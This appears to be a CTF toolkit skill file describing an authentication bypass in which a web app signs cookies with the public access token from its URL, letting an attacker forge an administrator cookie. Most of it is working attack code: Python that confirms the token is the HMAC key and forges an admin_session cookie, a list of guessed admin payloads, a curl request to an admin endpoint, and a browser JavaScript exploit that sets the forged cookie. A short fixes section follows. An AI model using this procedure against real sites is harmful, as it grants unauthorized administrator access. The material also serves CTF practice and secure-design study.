# Cookie HMAC Key Reuse → Backend Auth Bypass

> When the server uses the public access token from the URL as the Cookie signing key at the same time, and the backend directly trusts the claim fields in the Cookie payload, an attacker can forge an administrator identity.

---

## Applicable Scenarios

- Target is a web application whose URL path contains `access_token` / `token` / `key` parameters
- Response headers set a signed Cookie (e.g., `student_gate=<payload>.<signature>`)
- Multiple signed Cookies (student side + admin side) may share one key
- The backend Cookie payload contains client-controllable permission claims (e.g., `{"admin":true}`)

## Keywords

- HMAC key reuse / signature key reuse
- Known-key session forgery
- Client-side claims-based auth
- Cookie signature bypass

## Attack Flow

### Step 1: Extract the access token from the URL

The entry URL typically shows:

```
/access/blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

Extract the token:

```
blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

### Step 2: Observe the student_gate Cookie

Visiting the entry sets a signed Cookie in the response headers. The format is usually:

```
Set-Cookie: <name>=<base64url(payload)>.<base64url(signature)>
```

Decode the payload to confirm its structure.

### Step 3: Verify the signature algorithm

Try to reproduce the signature using the known access token as the HMAC key:

```python
import hmac, hashlib, base64

access_token = "token extracted from the URL"
payload_b64 = "payload portion extracted from the Cookie"
expected_sig = "signature portion extracted from the Cookie"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

computed = b64url(hmac.new(
    access_token.encode(),
    payload_b64.encode(),
    hashlib.sha256
).digest())

print("match" if computed == expected_sig else "no match")
```

If it matches → confirmed that `the access token IS the HMAC key`.

### Step 4: Guess the admin Cookie name and payload structure

Common admin Cookie names:

- `admin_session`
- `admin_token`
- `admin_auth`
- `manage_token`
- `backstage_session`

Payload structure probing directions (try one by one until a 200 is returned):

```json
{"admin":true}
{"role":"admin"}
{"isAdmin":true}
{"access":"admin"}
{"level":"admin"}
{"user":"admin"}
{"authenticated":true}
{"type":"admin"}
```

### Step 5: Forge the admin Cookie

```python
import hmac, hashlib, json, base64

access_token = "known token"
payload = {"admin": True}

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = b64url(hmac.new(
    access_token.encode(), payload_b64.encode(), hashlib.sha256
).digest())

cookie = f"admin_session={payload_b64}.{sig}"
print(cookie)
```

### Step 6: Verify backend privileges

```bash
curl -k -H "Cookie: <cookie from the previous step>" https://target/api/admin/me
```

A response of `{"admin":true}` or 200 + admin data means success.

## Browser Reproduction

```javascript
async function exploit() {
  const token = location.pathname.split('/access/')[1];
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey('raw', enc.encode(token),
    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const payload = btoa('{"admin":true}').replace(/=/g, '');
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  document.cookie = `admin_session=${payload}.${sigB64}; path=/; Secure`;
  location.reload();
}
exploit();
```

## Fixes

1. Sign Cookies with a separate server-side key; do not share it with the URL token
2. Backend privileges must be based on server-side sessions, not client-declared Cookie payload claims
3. Use different signing keys for different roles
4. Add claims such as `iat` / `exp` / `typ` to the Cookie and validate them
5. Handle signature parsing failures silently (return 401 on failure, not 500)

## Related Case

- class.pangbaoba.me CTF lab backend bypass (student_gate and admin_session share the access token as the HMAC key; `{"admin":true}` directly grants administrator privileges)

## Related Skills

- `CTF-Sandbox-Orchestrator/competition-web-runtime/SKILL.md` — web runtime analysis
- `CTF-Sandbox-Orchestrator/competition-jwt-claim-confusion/SKILL.md` — similar token claim confusion
- `reverse-engineering/languages-platforms.md` — JWT / OAuth related
